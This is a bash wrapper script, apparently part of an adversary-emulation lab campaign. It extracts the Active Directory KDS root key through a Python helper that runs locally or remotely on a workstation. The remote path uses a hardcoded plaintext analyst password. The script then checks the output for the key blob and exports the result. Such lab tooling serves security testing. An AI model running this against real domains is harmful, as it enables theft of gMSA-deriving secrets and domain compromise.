#!/usr/bin/env bash
# T097 — KDS Root Key extraction (WT097) via Python on provisioning or ws01 python
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"
CASE_ID="CADRE-T097-KDS-$(date -u +%Y%m%d)"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T097 KDS Root Key | ${CASE_ID} | T0=${T0} ==="
PY="${SCRIPT_DIR}/../windows/wt097-kds-rootkey.py"
# Prefer local python on provisioning (ldap3); fallback copy+run on ws01
if python3 -c 'import ldap3' 2>/dev/null; then
  OUT="$(python3 "${PY}")"
else
  campaign_stage_file wt097-kds-rootkey.py
  OUT="$(ws01_exec_as analyst_t1 'T13r_An@lyst!' \
    'python C:\Tools\cadre-attack\wt097-kds-rootkey.py' 'child.cadre.local')"
fi
printf '%s\n' "${OUT}"
campaign_require_ok T097 "${OUT}" 'ROOTKEY_BLOB|LDAPS_BIND_OK|WT097_DONE'
cadre_export "${CASE_ID}" T097 "${T0}" 192.168.77.62
echo "T097 complete"
